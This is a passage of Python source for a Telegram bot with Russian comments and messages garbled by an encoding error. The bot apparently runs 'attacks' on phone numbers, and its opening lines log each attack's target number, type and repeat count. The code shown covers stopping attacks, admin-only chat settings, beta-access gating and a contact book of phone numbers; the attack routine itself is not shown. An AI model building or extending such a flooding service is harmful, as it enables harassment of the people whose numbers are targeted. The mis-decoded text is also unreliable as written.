    print(f"üöÄ –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏: @{username} (ID: {user_id}) | –ù–æ–º–µ—Ä: {number} | –¢–∏–ø: {attack_type} | –ü–æ–≤—Ç–æ—Ä—ã: {replay} | {start_time}")
    stop_event = asyncio.Event()
    stop_events[user_id] = stop_event

    await state.update_data(success_count=0)
    await async_attacks(user_id, username, number, attack_type, replay, stop_event, state)

async def stop_attacks(user_id):
    """
    –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –∞—Ç–∞–∫—É –¥–ª—è –∑–∞–¥–∞–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—è —Ñ–ª–∞–≥ stop_event.
    """
    if user_id in stop_events:
        stop_events[user_id].set()
    else:
        print(f"‚ö† –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–π –∞—Ç–∞–∫–∏ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}")


#### –•–µ–Ω–¥–ª–µ—Ä—ã ####

### –ë–∞–∑–æ–≤—ã–µ –∫–æ–º–∞–Ω–¥—ã

@router.message(CommandStart())
async def cmd_start(message: Message):
    """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∫–æ–º–∞–Ω–¥—É /start –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –º–µ–Ω—é."""
    if is_user_allowed(message.from_user.id):
        await message.answer(text['greetings'], reply_markup=kb.main)
    else:
        user_id = message.from_user.id  # <-- –¢–µ–ø–µ—Ä—å user_id –æ–±—ä—è–≤–ª–µ–Ω
        username = message.from_user.username  # <-- –ü–æ–ª—É—á–∞–µ–º username 
        chat_id = message.chat.id if message.chat else user_id  # –ò—Å–ø–æ–ª—å–∑—É–µ–º user_id, –µ—Å–ª–∏ chat_id –Ω–µ –Ω–∞–π–¥–µ–Ω
        await notify_admin_about_request(message.bot, user_id, username)
        await message.answer("üíî –ü—Ä–æ—Å—Ç–∏—Ç–µ –Ω–æ –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–µ–º –±–µ—Ç–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞—à–µ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –æ–∂–∏–¥–∞–π—Ç–µ —Ä–µ–ª–∏–∑–∞\n\n‚è≥ –í–∞—à –∑–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º.")

@router.message(Command("stop"))
async def stop_command_handler(message: Message, state: FSMContext):
    """
    –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /stop.
    –û—á–∏—â–∞–µ—Ç —Å–æ—Å—Ç–æ—è–Ω–∏–µ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ —Å–æ–æ–±—â–∞–µ—Ç, —á—Ç–æ –±–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.
    –ß—Ç–æ–±—ã –≤–æ–∑–æ–±–Ω–æ–≤–∏—Ç—å —Ä–∞–±–æ—Ç—É, –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω –æ—Ç–ø—Ä–∞–≤–∏—Ç—å /start.
    """
    await state.clear()

# –ö–æ–º–∞–Ω–¥—ã —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∫–∞—Å—Ç–æ–º –∞–π–¥–∏ —á–∞—Ç–æ–≤

@router.message(Command("set_admin_chat"))
async def set_admin_chat(message: types.Message):
    print(f"–ö–æ–º–∞–Ω–¥–∞ /set_admin_chat –æ—Ç {message.from_user.id}")
    """–ü–æ–∑–≤–æ–ª—è–µ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É –∏–∑–º–µ–Ω–∏—Ç—å ADMIN_CHAT_ID –∏ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –µ–≥–æ."""
    if message.from_user.id not in allowed_user_id:
        await message.answer(text['norights'])
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer("‚ùå –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /set_admin_chat <ID —á–∞—Ç–∞>")
        return

    try:
        chat_id = int(args[1])
    except ValueError:
        await message.answer("‚ùå –û—à–∏–±–∫–∞! ID —á–∞—Ç–∞ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º.")
        return

    settings = load_users_pend()
    settings["admin_chat_id"] = chat_id  # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–≤—ã–π ID
    save_users_pend(settings)  # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ —Ñ–∞–π–ª

    global ADMIN_CHAT_ID
    ADMIN_CHAT_ID = chat_id  # –û–±–Ω–æ–≤–ª—è–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –≤ –∫–æ–¥–µ

    await message.answer(f"‚úÖ `ADMIN_CHAT_ID` —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: `{chat_id}`", parse_mode="Markdown")


@router.message(Command("set_output_chat"))
async def set_output_chat(message: types.Message):
    """–ü–æ–∑–≤–æ–ª—è–µ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É –∏–∑–º–µ–Ω–∏—Ç—å OUTPUT_CHAT_ID –∏ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –µ–≥–æ."""
    print(f"–ö–æ–º–∞–Ω–¥–∞ /set_output_chat –æ—Ç {message.from_user.id}")
    if message.from_user.id not in allowed_user_id:
        await message.answer(text['norights'])
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer("‚ùå –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /set_output_chat <ID —á–∞—Ç–∞>")
        return

    try:
        chat_id = int(args[1])
    except ValueError:
        await message.answer("‚ùå –û—à–∏–±–∫–∞! ID —á–∞—Ç–∞ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º.")
        return

    settings = load_users_pend()
    settings["output_chat_id"] = chat_id  # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–≤—ã–π ID
    save_users_pend(settings)  # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ —Ñ–∞–π–ª

    global OUTPUT_CHAT_ID
    OUTPUT_CHAT_ID = chat_id  # –û–±–Ω–æ–≤–ª—è–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –≤ –∫–æ–¥–µ

    await message.answer(f"‚úÖ `OUTPUT_CHAT_ID` —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: `{chat_id}`", parse_mode="Markdown")

# –§—É–Ω–∫—Ü–∏—è —Å—Ç–∞—Ç—É—Å–∞ –±–æ—Ç–∞

@router.message(Command("status"))
async def send_status_options(message: types.Message):
    print(f"–ö–æ–º–∞–Ω–¥–∞ /status –æ—Ç {message.from_user.id}")
    await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç–∞—Ç—É—Å:", reply_markup=kb.statusbut)

# –§—É–Ω–∫—Ü–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏

@router.message(Command("update"))
async def send_update_log(message: types.Message, command: CommandObject):
    if message.from_user.id in allowed_user_id:
        log_text = command.args
        if not log_text:
            await message.answer("‚ùå –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: <code>/update –≤–∞—à –ª–æ–≥</code>", parse_mode="HTML")
            return

        formatted_log = f"<b>üîÑ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–æ—Ç–∞:</b>\n<pre>{log_text}</pre>"

        await message.bot.send_message(OUTPUT_CHAT_ID, formatted_log, parse_mode="HTML")

        await message.answer("‚úÖ –õ–æ–≥ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!")
        print("‚úÖ –õ–æ–≥ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!")
    else:
        await message.answer(text['norights'])

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∞–π–¥–∏ —á–∞—Ç–∞

@router.message(Command("get_chat_id"))
async def get_chat_id(message: types.Message):
    await message.answer(f"Chat ID: <code>{message.chat.id}</code>", parse_mode="HTML")

# üõ† –ö–æ–º–∞–Ω–¥–∞ /admin (—Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–æ–≤)

@router.message(Command("admin"))
async def admin_panel(message: types.Message):
    print(f"–ö–æ–º–∞–Ω–¥–∞ /admin –æ—Ç {message.from_user.id}")
    if message.from_user.id in allowed_user_id:
        await message.answer("üîß *–ü–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞*", reply_markup=kb.admin_keyboard(), parse_mode="Markdown")
    else:
        await message.answer("üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞!")

### –§—É–Ω–∫—Ü–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ ###


PER_PAGE = 10  # –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É

# –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å —Ñ–∞–π–ª–æ–º (–∫–æ–Ω—Ç–∞–∫—Ç—ã)
def load_contacts() -> dict:
    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –∏–∑ —Ñ–∞–π–ª–∞ users.json –∏–ª–∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ø—É—Å—Ç–æ–π —Å–ª–æ–≤–∞—Ä—å."""
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}

def save_contacts(users_data: dict) -> None:
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç –¥–∞–Ω–Ω—ã–µ –≤ —Ñ–∞–π–ª users.json."""
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users_data, f, ensure_ascii=False, indent=4)

def get_user_contacts(user_id: int) -> list:
    """
    –ò–∑–≤–ª–µ–∫–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ —Ñ–∞–π–ª–∞.
    –ï—Å–ª–∏ —Å–ø–∏—Å–æ–∫ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç, –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –ø—É—Å—Ç–æ–π —Å–ø–∏—Å–æ–∫.
    """
    users = load_contacts()
    user_id_str = str(user_id)
    if user_id_str in users:
        contacts = users[user_id_str].get("contacts")
        if contacts is None or not isinstance(contacts, list):
            return []
        return contacts
    return []


# FSM –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –Ω–æ–≤–æ–≥–æ –∫–æ–Ω—Ç–∞–∫—Ç–∞
class ContactStates(StatesGroup):
    waiting_for_new_contact = State()

# FSM –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–∞
class DeleteContactState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_name = State()


# --- –ö–ª–∞–≤–∏–∞—Ç—É—Ä—ã ---

def get_contacts_buttons_keyboard(user_id: int, current_page: int, contacts: list, per_page: int = PER_PAGE) -> InlineKeyboardMarkup:
    """
    –§–æ—Ä–º–∏—Ä—É–µ—Ç –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è —ç–∫—Ä–∞–Ω–∞ ¬´–í–∞—à–∏ –∫–æ–Ω—Ç–∞–∫—Ç—ã ‚òé¬ª –≤ –≤–∏–¥–µ –∫–Ω–æ–ø–æ–∫.
    
    –í–µ—Ä—Ö–Ω—è—è —á–∞—Å—Ç—å: –¥–æ per_page –∫–Ω–æ–ø–æ–∫, –∫–∞–∂–¥–∞—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç –∫–æ–Ω—Ç–∞–∫—Ç –≤ —Ñ–æ—Ä–º–∞—Ç–µ "–Ω–æ–º–µ—Ä ‚Äî –Ω–∞–∑–≤–∞–Ω–∏–µ".
    –°–ª–µ–¥—É—é—â–∞—è —Å—Ç—Ä–æ–∫–∞: –¥–≤–µ –∫–Ω–æ–ø–∫–∏ ¬´–î–æ–±–∞–≤–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç—ã üíæ¬ª –∏ ¬´–£–¥–∞–ª–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç—ã ‚ùå¬ª.
    –ó–∞—Ç–µ–º ‚Äì —Å—Ç—Ä–æ–∫–∞ –Ω–∞–≤–∏–≥–∞—Ü–∏–∏: –µ—Å–ª–∏ –µ—Å—Ç—å –ø—Ä–µ–¥—ã–¥—É—â–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞, –∫–Ω–æ–ø–∫–∞ "‚óÄ"; –∑–∞—Ç–µ–º –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä —Ç–µ–∫—É—â–µ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã; –∑–∞—Ç–µ–º, –µ—Å–ª–∏ –µ—Å—Ç—å —Å–ª–µ–¥—É—é—â–∞—è ‚Äì "‚ñ∂".
    –ü–æ—Å–ª–µ–¥–Ω—è—è —Å—Ç—Ä–æ–∫–∞ ‚Äì –∫–Ω–æ–ø–∫–∞ ¬´–ù–∞–∑–∞–¥ üîô¬ª –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é.
    """
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –ø—É—Å—Ç—ã–º —Å–ø–∏—Å–∫–æ–º inline_keyboard
    kbr = InlineKeyboardMarkup(inline_keyboard=[])
    total_pages = ((len(contacts) - 1) // per_page + 1) if contacts else 1
    start = (current_page - 1) * per_page
    end = start + per_page
    page_contacts = contacts[start:end]
    
    # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫–∏ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –∫–æ–Ω—Ç–∞–∫—Ç–∞ (–∫–∞–∂–¥–∞—è –∫–Ω–æ–ø–∫–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–π —Å—Ç—Ä–æ–∫–µ)
    for idx, contact in enumerate(page_contacts, start=start + 1):
        btn_text = f"{contact.get('phone', '')} ‚Äî {contact.get('contact_name', '')}"
        kbr.inline_keyboard.append([InlineKeyboardButton(text=btn_text, callback_data=f"contact_info_{idx}")])
    
    # –î–æ–±–∞–≤–ª—è–µ–º —Å—Ç—Ä–æ–∫—É —Å –∫–Ω–æ–ø–∫–∞–º–∏ "–î–æ–±–∞–≤–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç—ã üíæ" –∏ "–£–¥–∞–ª–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç—ã ‚ùå"
    kbr.inline_keyboard.append([
        InlineKeyboardButton(text="–î–æ–±–∞–≤–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç—ã üíæ", callback_data="add_contact"),
        InlineKeyboardButton(text="–£–¥–∞–ª–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç—ã ‚ùå", callback_data="delete_contacts")
    ])
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º –Ω–∞–≤–∏–≥–∞—Ü–∏–æ–Ω–Ω—É—é —Å—Ç—Ä–æ–∫—É: —Å—Ç—Ä–µ–ª–∫–∞ –≤–ª–µ–≤–æ, –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä —Å—Ç—Ä–∞–Ω–∏—Ü—ã, —Å—Ç—Ä–µ–ª–∫–∞ –≤–ø—Ä–∞–≤–æ
    nav_buttons = []
    if current_page > 1:
        nav_buttons.append(InlineKeyboardButton(text="‚óÄ", callback_data=f"contacts_page_{current_page - 1}"))
    nav_buttons.append(InlineKeyboardButton(text=f"{current_page}/{total_pages}", callback_data="ignore"))
    if current_page < total_pages:
        nav_buttons.append(InlineKeyboardButton(text="‚ñ∂", callback_data=f"contacts_page_{current_page + 1}"))
    kbr.inline_keyboard.append(nav_buttons)
    
    # –î–æ–±–∞–≤–ª—è–µ–º –ø–æ—Å–ª–µ–¥–Ω—é—é —Å—Ç—Ä–æ–∫—É —Å –∫–Ω–æ–ø–∫–æ–π "–ù–∞–∑–∞–¥ üîô"
    kbr.inline_keyboard.append([InlineKeyboardButton(text="–ù–∞–∑–∞–¥ üîô", callback_data="contacts_back")])
    
    return kbr



@router.callback_query(F.data == "ignore")
async def ignore_callback(callback: CallbackQuery):
    await callback.answer()

def get_add_contact_keyboard() -> InlineKeyboardMarkup:
    """–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è —ç–∫—Ä–∞–Ω–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–∞ —Å –∫–Ω–æ–ø–∫–æ–π –ù–∞–∑–∞–¥."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="–ù–∞–∑–∞–¥ üîô", callback_data="cancel_add_contact")]
    ])

def get_delete_method_keyboard() -> InlineKeyboardMarkup:
    """–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –≤—ã–±–æ—Ä–∞ –º–µ—Ç–æ–¥–∞ —É–¥–∞–ª–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–∞."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="–ü–æ –Ω–æ–º–µ—Ä—É üìû", callback_data="del_by_phone")],
        [InlineKeyboardButton(text="–ü–æ –Ω–∞–∑–≤–∞–Ω–∏—é üìù", callback_data="del_by_name")],
        [InlineKeyboardButton(text="–ù–∞–∑–∞–¥ üîô", callback_data="delete_contacts_back")]
    ])


# --- –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ ---

@router.callback_query(F.data == "get_contacts")
async def show_contacts(callback: CallbackQuery, state: FSMContext):
    """
    –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ö–æ–Ω—Ç–∞–∫—Ç—ã üíÆ". –í—ã–≤–æ–¥–∏—Ç —ç–∫—Ä–∞–Ω ¬´–í–∞—à–∏ –∫–æ–Ω—Ç–∞–∫—Ç—ã ‚òé¬ª —Å –ø–æ—Å—Ç—Ä–∞–Ω–∏—á–Ω—ã–º –≤—ã–≤–æ–¥–æ–º.
    """
    user_id = callback.from_user.id
    contacts = get_user_contacts(user_id)
    contacts_text = "–í–∞—à–∏ –∫–æ–Ω—Ç–∞–∫—Ç—ã ‚òé"
    kb_buttons = get_contacts_buttons_keyboard(user_id, current_page=1, contacts=contacts)
    try:
        await callback.message.edit_text(contacts_text, reply_markup=kb_buttons)
    except Exception as e:
        await callback.answer()
    else:
        await callback.answer()

@router.callback_query(F.data.startswith("contacts_page_"))
async def contacts_page_handler(callback: CallbackQuery, state: FSMContext):
    """
    –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –º–µ–∂–¥—É —Å—Ç—Ä–∞–Ω–∏—Ü–∞–º–∏ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤.
    """
    user_id = callback.from_user.id
    try:
        page = int(callback.data.split("_")[-1])
    except ValueError:
        page = 1
    contacts = get_user_contacts(user_id)
    contacts_text = "–í–∞—à–∏ –∫–æ–Ω—Ç–∞–∫—Ç—ã ‚òé"
    kb_buttons = get_contacts_buttons_keyboard(user_id, current_page=page, contacts=contacts)
    await callback.message.edit_text(contacts_text, reply_markup=kb_buttons)
    await callback.answer()

@router.callback_query(F.data == "add_contact")
async def add_contact(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "üíæ –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–æ–Ω—Ç–∞–∫—Ç –≤ —Ñ–æ—Ä–º–∞—Ç–µ: –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–∞–∑–≤–∞–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–∞",
        reply_markup=get_add_contact_keyboard()
    )
    await state.set_state(ContactStates.waiting_for_new_contact)
    await callback.answer()

@router.callback_query(F.data == "cancel_add_contact")
async def cancel_add_contact(callback: CallbackQuery, state: FSMContext):
    """
    –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ù–∞–∑–∞–¥ üîô" –≤ —Ä–µ–∂–∏–º–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–∞.
    –í—ã—Ö–æ–¥–∏—Ç –∏–∑ —Å–æ—Å—Ç–æ—è–Ω–∏—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —ç–∫—Ä–∞–Ω –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤.
    """
    user_id = callback.from_user.id
    contacts = get_user_contacts(user_id)
    contacts_text = "–í–∞—à–∏ –∫–æ–Ω—Ç–∞–∫—Ç—ã ‚òé"
    kb_buttons = get_contacts_buttons_keyboard(user_id, current_page=1, contacts=contacts)
    await state.clear()
    await callback.message.edit_text(contacts_text, reply_markup=kb_buttons)
    await callback.answer()

@router.message(ContactStates.waiting_for_new_contact)
async def process_new_contact(message: Message, state: FSMContext):
    """
    –û–∂–∏–¥–∞–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–Ω—Ç–∞–∫—Ç–æ–º –≤ —Ñ–æ—Ä–º–∞—Ç–µ "–Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–∞–∑–≤–∞–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–∞".
    –ü–æ—Å–ª–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∏ –æ—Å—Ç–∞–µ—Ç—Å—è –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –æ–∂–∏–¥–∞–Ω–∏—è.
    """
    text = message.text.strip()
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–æ–Ω—Ç–∞–∫—Ç –≤ —Ñ–æ—Ä–º–∞—Ç–µ: –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–∞–∑–≤–∞–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–∞")
        return
    phone, contact_name = parts
    user_id = message.from_user.id
    username = message.from_user.username or "–ë–µ–∑ username"
    users = load_contacts()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {"owner": f"{username} (ID: {user_id})", "contacts": []}
    if "contacts" not in users[user_id_str] or not isinstance(users[user_id_str]["contacts"], list):
        users[user_id_str]["contacts"] = []
    new_contact = {"phone": phone, "contact_name": contact_name}
    users[user_id_str]["contacts"].append(new_contact)
    save_contacts(users)
    await message.answer(
        f"‚úÖ –ö–æ–Ω—Ç–∞–∫—Ç –¥–æ–±–∞–≤–ª–µ–Ω!\n–¢–µ–ª–µ—Ñ–æ–Ω: {phone}\n–ù–∞–∑–≤–∞–Ω–∏–µ: {contact_name}\n\n–û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π –∫–æ–Ω—Ç–∞–∫—Ç –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ '–ù–∞–∑–∞–¥ üîô'")
    # –°–æ—Å—Ç–æ—è–Ω–∏–µ –æ—Å—Ç–∞–µ—Ç—Å—è –¥–ª—è –æ–∂–∏–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –∫–æ–Ω—Ç–∞–∫—Ç–∞.

@router.callback_query(F.data == "delete_contacts")
async def choose_delete_method(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("–í—ã–±–µ—Ä–∏—Ç–µ –º–µ—Ç–æ–¥ —É–¥–∞–ª–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–∞:", reply_markup=get_delete_method_keyboard())
    await callback.answer()

@router.callback_query(F.data == "del_by_phone")
async def delete_by_phone_choice(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–æ–Ω—Ç–∞–∫—Ç–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è (—Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã):", )
    await state.set_state(DeleteContactState.waiting_for_phone)
    await callback.answer()

@router.callback_query(F.data == "del_by_name")
async def delete_by_name_choice(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è:")
    await state.set_state(DeleteContactState.waiting_for_name)
    await callback.answer()

@router.message(DeleteContactState.waiting_for_phone)
async def process_delete_by_phone(message: Message, state: FSMContext):
    """ –û–∂–∏–¥–∞–µ—Ç –Ω–æ–º–µ—Ä –∫–æ–Ω—Ç–∞–∫—Ç–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è. """
    phone_to_delete = message.text.strip()
    user_id = message.from_user.id
    username = message.from_user.username if message.from_user.username else "–ë–µ–∑ —é–∑–µ—Ä–Ω–µ–π–º–∞"

    users = load_contacts()
    user_id_str = str(user_id)

    if user_id_str not in users or "contacts" not in users[user_id_str]:
        await message.answer("–£ –≤–∞—Å –Ω–µ—Ç –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è.", reply_markup=kb.main)
        await state.clear()
        return

    contacts = users[user_id_str]["contacts"]
    contact_to_delete = next((c for c in contacts if c.get("phone") == phone_to_delete), None)

    if not contact_to_delete:
        await message.answer("–ö–æ–Ω—Ç–∞–∫—Ç —Å —Ç–∞–∫–∏–º –Ω–æ–º–µ—Ä–æ–º –Ω–µ –Ω–∞–π–¥–µ–Ω. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π –Ω–æ–º–µ—Ä –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ '–ù–∞–∑–∞–¥ üîô'")
    else:
        name = contact_to_delete.get("contact_name", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –∫–æ–Ω—Ç–∞–∫—Ç")
        users[user_id_str]["contacts"] = [c for c in contacts if c.get("phone") != phone_to_delete]
        save_contacts(users)

        log_msg = f"üóë –ö–æ–Ω—Ç–∞–∫—Ç —É–¥–∞–ª—ë–Ω: {name} ({phone_to_delete}) –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º @{username} (ID: {user_id})"
        print(log_msg)
        logging.info(log_msg)

        await message.answer("–ö–æ–Ω—Ç–∞–∫—Ç —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–º–µ—Ä –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –¥—Ä—É–≥–æ–≥–æ –∫–æ–Ω—Ç–∞–∫—Ç–∞ –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ '–ù–∞–∑–∞–¥ üîô'")

@router.message(DeleteContactState.waiting_for_name)
async def process_delete_by_name(message: Message, state: FSMContext):
    """ –û–∂–∏–¥–∞–µ—Ç –Ω–∞–∑–≤–∞–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–∞ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è. """
    name_to_delete = message.text.strip().lower()
    user_id = message.from_user.id
